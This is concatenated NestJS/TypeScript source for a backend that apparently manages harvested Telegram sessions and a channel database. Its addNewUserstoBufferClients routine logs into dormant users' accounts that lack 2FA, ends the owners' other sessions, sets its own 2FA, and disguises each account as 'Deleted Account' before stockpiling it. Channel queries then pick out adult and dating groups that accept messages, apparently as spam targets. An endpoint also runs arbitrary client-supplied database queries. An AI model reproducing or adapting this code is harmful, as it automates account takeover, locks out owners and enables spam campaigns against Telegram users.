(error) {\r\n                        parseError(error);\r\n                        badIds.push(document.mobile);\r\n                        this.remove(document.mobile)\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    }\r\n                } else {\r\n                    console.log(\"Number is a Active Client\");\r\n                    goodIds.push(document.mobile)\r\n                    this.remove(document.mobile)\r\n                }\r\n            }\r\n            goodIds = [...goodIds, ...clientIds, ...promoteclientIds]\r\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\r\n            this.addNewUserstoBufferClients(badIds, goodIds);\r\n        } else {\r\n            console.log(\"ignored active check buffer channels as active client setup exists\")\r\n        }\r\n    }\r\n\r\n    async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {\r\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\r\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\r\n        console.log(\"New buffer documents to be added: \", documents.length)\r\n        while (badIds.length > 0 && documents.length > 0) {\r\n            const document = documents.shift();\r\n            try {\r\n                try {\r\n                    const client = await this.telegramService.createClient(document.mobile, false);\r\n                    const hasPassword = await client.hasPassword();\r\n                    console.log(\"hasPassword: \", hasPassword);\r\n                    if (!hasPassword) {\r\n                        await client.removeOtherAuths();\r\n                        await client.set2fa();\r\n                        console.log(\"waiting for setting 2FA\");\r\n                        await sleep(30000);\r\n                        await client.updateUsername('');\r\n                        await sleep(3000)\r\n                        await client.updatePrivacyforDeletedAccount();\r\n                        await sleep(3000)\r\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\r\n                        await sleep(3000)\r\n                        await client.deleteProfilePhotos();\r\n                        await sleep(2000);\r\n                        await this.telegramService.removeOtherAuths(document.mobile);\r\n                        const channels = await client.channelInfo(true)\r\n                        console.log(\"Inserting Document\");\r\n                        const bufferClient = {\r\n                            tgId: document.tgId,\r\n                            session: document.session,\r\n                            mobile: document.mobile,\r\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\r\n                            channels: channels.ids.length,\r\n                        }\r\n                        await this.create(bufferClient);\r\n                        await this.usersService.update(document.tgId, { twoFA: true })\r\n                        console.log(\"=============Created BufferClient=============\")\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                        badIds.pop();\r\n                    } else {\r\n                        console.log(\"Failed to Update as BufferClient has Password\");\r\n                        await this.usersService.update(document.tgId, { twoFA: true })\r\n                        await this.telegramService.deleteClient(document.mobile)\r\n                    }\r\n                } catch (error) {\r\n                    parseError(error)\r\n                    await this.telegramService.deleteClient(document.mobile)\r\n                }\r\n            } catch (error) {\r\n                parseError(error)\r\n                console.error(\"An error occurred:\", error);\r\n            }\r\n            await this.telegramService.deleteClient(document.mobile)\r\n        }\r\n        setTimeout(() => {\r\n            this.joinchannelForBufferClients()\r\n        }, 2 * 60 * 1000);\r\n    }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\nimport {  IsNumber, IsString } from 'class-validator';\r\n\r\nexport class CreateBufferClientDto {\r\n  @ApiProperty({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsString()\r\n  readonly tgId: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsString()\r\n  readonly mobile: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Date of the session',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsString()\r\n  readonly availableDate: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Session identifier',\r\n    example: 'session123',\r\n  })\r\n  @IsString()\r\n  readonly session: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels: number;\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\r\n\r\nexport class SearchBufferClientDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Telegram ID of the client',\r\n    example: '123456789',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly tgId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Mobile number of the client',\r\n    example: '+1234567890',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly mobile?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'availableDate of the bufferClient',\r\n    example: '2023-06-22',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly availableDate?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Session identifier',\r\n    example: 'session123',\r\n  })\r\n  @IsOptional()\r\n  @IsString()\r\n  readonly session?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Channel Count',\r\n    example: 23,\r\n    type: Number\r\n  })\r\n  @IsNumber()\r\n  readonly channels?: number;\r\n}\r\n","import { PartialType } from '@nestjs/swagger';\r\nimport { CreateBufferClientDto } from './create-buffer-client.dto';\r\n\r\nexport class UpdateBufferClientDto extends PartialType(CreateBufferClientDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\n\r\nexport type BufferClientDocument = BufferClient & Document;\r\n@Schema({ collection: 'bufferClients', versionKey: false, autoIndex: true,\r\n  timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})  // Specify the collection name here\r\nexport class BufferClient {\r\n  @Prop({ required: true})\r\n  tgId: string;\r\n\r\n  @Prop({ required: true, unique: true })\r\n  mobile: string;\r\n  \r\n  @Prop({ required: true })\r\n  session: string;\r\n\r\n  @Prop({ required: true })\r\n  availableDate: string;\r\n\r\n  @Prop({ required: true, type: Number })\r\n  channels: number;\r\n}\r\n\r\nexport const BufferClientSchema = SchemaFactory.createForClass(BufferClient);\r\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { BuildService } from './build.service';\r\n\r\n@ApiTags('Build')\r\n@Controller('builds')\r\nexport class BuildController {\r\n  constructor(private readonly buildService: BuildService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get build data' })\r\n  async findOne(): Promise<any>{\r\n    return this.buildService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update build' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.buildService.update( updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { BuildService } from './build.service';\r\nimport { BuildController } from './build.controller';\r\nimport { BuildSchema } from './builds.schema';\r\nimport { NpointModule } from '../n-point/npoint.module';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    BuildModule,\r\n    MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: BuildSchema }]),\r\n    NpointModule,\r\n  ],\r\n  providers: [BuildService],\r\n  controllers: [BuildController],\r\n  exports: [BuildModule],\r\n})\r\nexport class BuildModule { }","import { Injectable, NotFoundException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { Build } from './builds.schema';\r\nimport { NpointService } from '../n-point/npoint.service';\r\n\r\n@Injectable()\r\nexport class BuildService {\r\n    constructor(@InjectModel('buildModule') private buildModel: Model<Build>,\r\n        private npointSerive: NpointService) {\r\n    }\r\n\r\n    async OnModuleInit() {\r\n        console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        const user = await this.buildModel.findOne({}).exec();\r\n        if (!user) {\r\n            throw new NotFoundException(`buildModel not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.buildModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        try {\r\n            await this.npointSerive.updateDocument(\"3375d15db1eece560188\", updatedUser)\r\n            console.log(\"Updated document successfully in npoint\")\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`buildModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type BuildDocument = Build & Document;\r\n\r\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\r\n    toJSON: {\r\n      virtuals: true,\r\n      transform: (doc, ret) => {\r\n        delete ret._id;\r\n      },\r\n    },})\r\nexport class Build {}\r\n\r\nexport const BuildSchema = SchemaFactory.createForClass(Build);\r\nBuildSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","// src/channels/channels.controller.ts\r\nimport { Controller, Get, Post, Body, Patch, Param, Delete, NotFoundException, Query, BadRequestException } from '@nestjs/common';\r\nimport { ChannelsService } from './channels.service';\r\nimport { ApiTags, ApiOperation, ApiResponse, ApiQuery, ApiBody } from '@nestjs/swagger';\r\nimport { SearchChannelDto } from './dto/search-channel.dto';\r\nimport { CreateChannelDto } from './dto/create-channel.dto';\r\nimport { UpdateChannelDto } from './dto/update-channel.dto';\r\nimport { Channel } from './schemas/channel.schema';\r\n\r\n@ApiTags('Channels')\r\n@Controller('channels')\r\nexport class ChannelsController {\r\n  constructor(private readonly channelsService: ChannelsService) { }\r\n\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create a new  channel' })\r\n  async create(@Body() createChannelDto: CreateChannelDto) {\r\n    return this.channelsService.create(createChannelDto);\r\n  }\r\n  @Post('createMultiple')\r\n  @ApiOperation({ summary: 'Create multiple channels' })\r\n  @ApiBody({ type: [CreateChannelDto] })\r\n  async createMultiple(@Body() createChannelDtos: CreateChannelDto[]): Promise<string> {\r\n    return this.channelsService.createMultiple(createChannelDtos);\r\n  }\r\n\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search channels by filters' })\r\n  search(@Query() query: SearchChannelDto): Promise<Channel[]> {\r\n    console.log(query);\r\n    return this.channelsService.search(query);\r\n  }\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all  channels' })\r\n  async findAll() {\r\n    return this.channelsService.findAll();\r\n  }\r\n\r\n  @Get(':channelId')\r\n  @ApiOperation({ summary: 'Get an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'Return the  channel', type: Channel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async findOne(@Param('channelId') channelId: string) {\r\n    return this.channelsService.findOne(channelId);\r\n  }\r\n\r\n  @Patch(':channelId')\r\n  @ApiOperation({ summary: 'Update an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully updated.', type: Channel })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async update(@Param('channelId') channelId: string, @Body() updateChannelDto: UpdateChannelDto) {\r\n    return this.channelsService.update(channelId, updateChannelDto);\r\n  }\r\n\r\n  @Delete(':channelId')\r\n  @ApiOperation({ summary: 'Delete an  channel by channelId' })\r\n  //@apiresponse({ status: 200, description: 'The channel has been successfully deleted.' })\r\n  //@apiresponse({ status: 404, description: 'Channel not found' })\r\n  async remove(@Param('channelId') channelId: string) {\r\n    return this.channelsService.remove(channelId);\r\n  }\r\n}\r\n","// src/channels/channels.module.ts\r\nimport { Module } from '@nestjs/common';\r\nimport { MongooseModule } from '@nestjs/mongoose';\r\nimport { ChannelsService } from './channels.service';\r\nimport { ChannelsController } from './channels.controller';\r\nimport { Channel, ChannelSchema } from './schemas/channel.schema';\r\nimport { initModule } from '../ConfigurationInit/init.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    MongooseModule.forFeature([{ name: Channel.name, schema: ChannelSchema }]),\r\n  ],\r\n  controllers: [ChannelsController],\r\n  providers: [ChannelsService],\r\n  exports: [ChannelsService]\r\n})\r\nexport class ChannelsModule { }\r\n","// src/channels/channels.service.ts\r\nimport { BadRequestException, Injectable, InternalServerErrorException } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { CreateChannelDto } from './dto/create-channel.dto';\r\nimport { UpdateChannelDto } from './dto/update-channel.dto';\r\nimport { Channel, ChannelDocument } from './schemas/channel.schema';\r\n@Injectable()\r\nexport class ChannelsService {\r\n  constructor(\r\n    @InjectModel(Channel.name) private ChannelModel: Model<ChannelDocument>,\r\n  ) { console.log(Channel.name) }\r\n\r\n  async create(createChannelDto: CreateChannelDto): Promise<Channel> {\r\n    const createdChannel = new this.ChannelModel(createChannelDto);\r\n    return createdChannel.save();\r\n  }\r\n\r\n  async createMultiple(createChannelDtos: CreateChannelDto[]): Promise<string> {\r\n    const bulkOps = createChannelDtos.map((dto) => ({\r\n      updateOne: {\r\n        filter: { channelId: dto.channelId },\r\n        update: { $set: dto },\r\n        upsert: true\r\n      }\r\n    }));\r\n\r\n    await this.ChannelModel.bulkWrite(bulkOps, { ordered: false });\r\n    return 'Channels Saved';\r\n  }\r\n\r\n  async findAll(): Promise<Channel[]> {\r\n    return this.ChannelModel.find().exec();\r\n  }\r\n\r\n  async findOne(channelId: string): Promise<Channel> {\r\n    const channel = (await this.ChannelModel.findOne({ channelId }).exec())?.toJSON();\r\n    return channel;\r\n  }\r\n\r\n  async update(channelId: string, updateChannelDto: UpdateChannelDto): Promise<Channel> {\r\n    const updatedChannel = await this.ChannelModel.findOneAndUpdate(\r\n      { channelId },\r\n      { $set: updateChannelDto },\r\n      { new: true, upsert: true },\r\n    ).exec();\r\n    return updatedChannel;\r\n  }\r\n\r\n  async remove(channelId: string): Promise<void> {\r\n    const result = await this.ChannelModel.findOneAndDelete({ channelId }).exec();\r\n  }\r\n\r\n  async search(filter: any): Promise<Channel[]> {\r\n    console.log(filter)\r\n    return this.ChannelModel.find(filter).exec();\r\n  }\r\n\r\n  async getChannels(limit = 50, skip = 0, keywords = [], notIds = []) {\r\n    const pattern = new RegExp(keywords.join('|'), 'i');\r\n    const notPattern = new RegExp('online|board|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser', \"i\")\r\n    let query = {\r\n      $and: [\r\n        { username: { $ne: null } },\r\n        {\r\n          $or: [\r\n            { title: { $regex: pattern } },\r\n            { username: { $regex: pattern } }\r\n          ]\r\n        },\r\n        {\r\n          username: {\r\n            $not: {\r\n              $regex: \"^(\" + notIds.map(id => \"(?i)\" + id?.replace(/[.*+?^${}()|[\\]\\\\]/g, '\\\\$&'))?.join(\"|\") + \")$\"\r\n            }\r\n          }\r\n        },\r\n        {\r\n          title: { $not: { $regex: notPattern } }\r\n        },\r\n        {\r\n          username: { $not: { $regex: notPattern } }\r\n        },\r\n        {\r\n          sendMessages: false,\r\n          broadcast: false,\r\n          restricted: false\r\n        }\r\n      ]\r\n    };\r\n\r\n    const sort: { participantsCount: \"desc\" } = { participantsCount: \"desc\" };\r\n    try {\r\n      const result: Channel[] = await this.ChannelModel.find(query).sort(sort).skip(skip).limit(limit).exec();\r\n      return result;\r\n    } catch (error) {\r\n      console.error('Error:', error);\r\n      return [];\r\n    }\r\n  }\r\n\r\n  async executeQuery(query: any, sort?: any, limit?: number): Promise<Channel[]> {\r\n    try {\r\n      if (!query) {\r\n        throw new BadRequestException('Query is invalid.');\r\n      }\r\n      const queryExec = this.ChannelModel.find(query);\r\n      if (sort) {\r\n        queryExec.sort(sort);\r\n      }\r\n\r\n      if (limit) {\r\n        queryExec.limit(limit);\r\n      }\r\n\r\n      return await queryExec.exec();\r\n    } catch (error) {\r\n      throw new InternalServerErrorException(error.message);\r\n    }\r\n  }\r\n\r\n  async getActiveChannels(limit = 50, skip = 0, notIds = []) {\r\n    const query = {\r\n      '$and':\r\n        [\r\n          {\r\n            '$or':\r\n              [\r\n                { title: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\r\n                { username: { '$regex': /wife|adult|lanj|lesb|paid|coupl|cpl|randi|bhab|boy|girl|friend|frnd|boob|pussy|dating|swap|gay|sex|bitch|love|video|service|real|call|desi/i } },\r\n              ]\r\n          },\r\n          {\r\n            '$or': [\r\n              { title: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\r\n              { username: { '$not': { '$regex': /online|realestat|propert|board|design|realt|class|PROFIT|wholesale|retail|topper|exam|motivat|medico|shop|follower|insta|traini|cms|cma|subject|currency|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|invest|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|quot|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser/i } } },\r\n            ]\r\n          },\r\n          {\r\n            channelId: { '$nin': notIds },\r\n            participantsCount: { $gt: 1000 },\r\n            username: {$ne: null},\r\n            canSendMsgs: true,\r\n            restricted: false,\r\n            forbidden: false\r\n          }\r\n        ]\r\n    }\r\n\r\n    const sort: Record<string, 1 | -1> = notIds.length > 300 && false ? { randomField: 1 } : { participantsCount: -1 }\r\n    try {\r\n      const result: Channel[] = await this.ChannelModel.aggregate([\r\n        { $match: query },\r\n        { $skip: skip },\r\n        { $limit: limit },\r\n        { $addFields: { randomField: { $rand: {} } } }, // Add a random field\r\n        { $sort: sort }, // Sort by the random field\r\n        { $project: { randomField: 0 } } // Remove the random field from the output\r\n      ]).exec();\r\n      return result;\r\n    } catch (error) {\r\n      console.error('Error:', error);\r\n      return [];\r\n    }\r\n  }\r\n}\r\n","import { ApiProperty } from '@nestjs/swagger';\r\n\r\nexport class CreateChannelDto {\r\n  @ApiProperty({\r\n    description: 'Unique identifier for the channel',\r\n    example: '803387987',\r\n  })\r\n  channelId: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is a broadcast channel',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  broadcast?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Indicates if the channel can send messages',\r\n    example: true,\r\n  })\r\n  canSendMsgs: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is a megagroup',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  megagroup?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Number of participants in the channel',\r\n    example: 0,\r\n  })\r\n  participantsCount: number;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is restricted',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  restricted?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel can send messages',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  sendMessages?: boolean;\r\n\r\n  @ApiProperty({\r\n    description: 'Title of the channel',\r\n    example: 'Earn money with Ayesha',\r\n  })\r\n  title: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Username of the channel',\r\n    example: null,\r\n    required: false,\r\n  })\r\n  username?: string;\r\n\r\n  @ApiProperty({\r\n    description: 'Whether the channel is private',\r\n    example: false,\r\n    required: false,\r\n  })\r\n  private: boolean = false;\r\n\r\n  @ApiProperty({\r\n    default: false, example: false,\r\n    required: false,\r\n  })\r\n  forbidden: boolean = false;\r\n}\r\n","import { ApiPropertyOptional } from '@nestjs/swagger';\r\n\r\nexport class SearchChannelDto {\r\n  @ApiPropertyOptional({\r\n    description: 'Unique identifier for the channel',\r\n    example: '803387987',\r\n  })\r\n  channelId?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Title of the channel',\r\n    example: 'Earn money with Ayesha',\r\n  })\r\n  title?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'privacy of the channel',\r\n    example: false,\r\n  })\r\n  private?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Username of the channel',\r\n    example: 'ayesha_channel',\r\n  })\r\n  username?: string;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Indicates if the channel can send messages',\r\n    example: true,\r\n  })\r\n  canSendMsgs?: boolean;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Minimum number of participants in the channel',\r\n    example: 10,\r\n  })\r\n  minParticipantsCount?: number;\r\n\r\n  @ApiPropertyOptional({\r\n    description: 'Maximum number of participants in the channel',\r\n    example: 100,\r\n  })\r\n  maxParticipantsCount?: number;\r\n}\r\n","// src/channels/dto/update-channel.dto.ts\r\nimport { PartialType } from '@nestjs/swagger';\r\nimport { CreateChannelDto } from './create-channel.dto';\r\n\r\nexport class UpdateChannelDto extends PartialType(CreateChannelDto) {}\r\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport { Document } from 'mongoose';\r\nimport * as mongoose from 'mongoose';\r\n\r\nexport type ChannelDocument = Channel & Document;\r\n@Schema({\r\n  collection: 'channels', versionKey: false, autoIndex: true, timestamps: true,\r\n  toJSON: {\r\n    virtuals: true,\r\n    transform: (doc, ret) => {\r\n      delete ret._id;\r\n    },\r\n  },\r\n})\r\nexport class Channel {\r\n  @Prop({ required: true, unique: true })\r\n  channelId: string;\r\n\r\n  @Prop({ default: false })\r\n  broadcast: boolean;\r\n\r\n  @Prop({ default: true })\r\n  canSendMsgs: boolean;\r\n\r\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\r\n  participantsCount: number;\r\n\r\n  @Prop({ default: false })\r\n  restricted: boolean;\r\n\r\n  @Prop({ default: false })\r\n  sendMessages: boolean;\r\n\r\n  @Prop({ required: true })\r\n  title: string;\r\n\r\n  @Prop({ required: false, default: null })\r\n  username: string;\r\n\r\n  @Prop({ required: true, default: false })\r\n  private: boolean;\r\n\r\n  @Prop({ default: false, required: false })\r\n  forbidden: boolean\r\n}\r\n\r\nexport const ChannelSchema = SchemaFactory.createForClass(Channel);\r\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, HttpException, HttpStatus } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody, ApiParam, ApiResponse } from '@nestjs/swagger';\r\nimport { ClientService } from './client.service';\r\nimport { CreateClientDto } from './dto/create-client.dto';\r\nimport { Client } from './schemas/client.schema';\r\nimport { SearchClientDto } from './dto/search-client.dto';\r\nimport { UpdateClientDto } from './dto/update-client.dto';\r\n\r\n@ApiTags('Clients')\r\n@Controller('clients')\r\nexport class ClientController {\r\n  constructor(private readonly clientService: ClientService) {}\r\n\r\n  /**\r\n   * Create a new client\r\n   */\r\n  @Post()\r\n  @ApiOperation({ summary: 'Create user data' })\r\n  @ApiResponse({ status: 201, description: 'The user data has been successfully created.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid input data.' })\r\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.create(createClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Search for clients based on query parameters\r\n   */\r\n  @Get('search')\r\n  @ApiOperation({ summary: 'Search user data' })\r\n  @ApiResponse({ status: 200, description: 'Matching user data returned successfully.' })\r\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.search(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  @Get('updateClient/:clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\r\n  //@apiresponse({ status: 404, description: 'User data not found.' })\r\n  async updateClient(@Param('clientId') clientId: string) {\r\n    return this.clientService.updateClient(clientId);\r\n  }\r\n  \r\n  /**\r\n   * Get all clients with masked sensitive fields\r\n   */\r\n  @Get('maskedCls')\r\n  @ApiOperation({ summary: 'Get all user data with masked fields' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAllMasked(@Query() query: SearchClientDto) {\r\n    try {\r\n      return await this.clientService.findAllMasked(query);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get all clients\r\n   */\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get all user data' })\r\n  @ApiResponse({ status: 200, description: 'All user data returned successfully.' })\r\n  async findAll(): Promise<Client[]> {\r\n    try {\r\n      return await this.clientService.findAll();\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Get a specific client by ID\r\n   */\r\n  @Get(':clientId')\r\n  @ApiOperation({ summary: 'Get user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'User data returned successfully.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async findOne(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.findOne(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Update a specific client by ID\r\n   */\r\n  @Patch(':clientId')\r\n  @ApiOperation({ summary: 'Update user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully updated.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async update(@Param('clientId') clientId: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\r\n    try {\r\n      return await this.clientService.update(clientId, updateClientDto);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Delete a specific client by ID\r\n   */\r\n  @Delete(':clientId')\r\n  @ApiOperation({ summary: 'Delete user data by ID' })\r\n  @ApiResponse({ status: 200, description: 'The user data has been successfully deleted.' })\r\n  @ApiResponse({ status: 404, description: 'User data not found.' })\r\n  async remove(@Param('clientId') clientId: string): Promise<Client> {\r\n    try {\r\n      return await this.clientService.remove(clientId);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Execute a custom MongoDB query\r\n   */\r\n  @Post('query')\r\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\r\n  @ApiResponse({ status: 200, description: 'Query executed successfully.' })\r\n  @ApiResponse({ status: 400, description: 'Invalid query.' })\r\n  @ApiBody({ schema: { properties: { query: { type: 'object' }, sort: { type: 'object' }, limit: { type: 'number' }, skip: { type: 'number' } } } })\r\n  async executeQuery(@Body() requestBody: any): Promise<any> {\r\n    const { query, sort, limit, skip } = requestBody;\r\n    try {\r\n      return await this.clientService.executeQuery(query, sort, limit, skip);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Add a mobile number to the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/add')\r\n  @ApiOperation({ summary: 'Add a mobile number to the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number added successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async addPromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.addPromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  }\r\n\r\n  /**\r\n   * Remove a mobile number from the promoteMobile array for a specific client\r\n   */\r\n  @Patch(':clientId/promoteMobile/remove')\r\n  @ApiOperation({ summary: 'Remove a mobile number from the promoteMobile array for a specific client' })\r\n  @ApiParam({ name: 'clientId', description: 'The unique identifier of the client' })\r\n  @ApiBody({ schema: { properties: { mobileNumber: { type: 'string', example: '916265240911' } } } })\r\n  @ApiResponse({ status: 200, description: 'Mobile number removed successfully.' })\r\n  @ApiResponse({ status: 404, description: 'Client not found.' })\r\n  async removePromoteMobile(@Param('clientId') clientId: string, @Body('mobileNumber') mobileNumber: string) {\r\n    try {\r\n      return await this.clientService.removePromoteMobile(clientId, mobileNumber);\r\n    } catch (error) {\r\n      throw new HttpException(error.message, HttpStatus.NOT_FOUND);\r\n    }\r\n  